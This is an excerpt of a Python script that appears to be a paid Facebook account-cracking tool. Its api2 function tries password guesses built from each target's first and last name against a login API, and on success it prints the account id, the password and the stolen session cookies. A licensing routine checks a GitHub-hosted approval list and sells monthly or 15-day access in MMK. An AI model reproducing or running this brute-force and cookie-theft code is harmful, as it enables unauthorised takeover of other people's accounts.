...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;32m [Ox-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Ox-OK] '+ids+' | '+pas+'\033[1;92m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
...
def Subscraption():
	...
	clear()
	time.sleep(0.0)
	r1=requests.get("https://github.com/LeePelYaMal/Approval/blob/main/MinHtet.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32mOx Toll Paid You Need Get Approved First\033[1;37m\n")
		print(" \033[1;37mNote : \033[1;36m1  Month 25000 MMK ")
		print(" \033[1;37mNote : \033[1;36m15 Day   15000 MMK ")
		print ("")
		print(" \033[1;37mYour Key is Not Approved ")
		print("")
		print(" \033[1;33mCopy And Send Key To Admin")
		print ("")
		print (" \033[1;32mYour Key : \033[1;37m"+ak+Ox+key1)
		print ("")
		name = input(" Your Name : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(0.1)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Ox+''+key1
		os.system('xdg-open https://www.facebook.com/Mr.MinHtet404')
		Subscraption()        
Subscraption()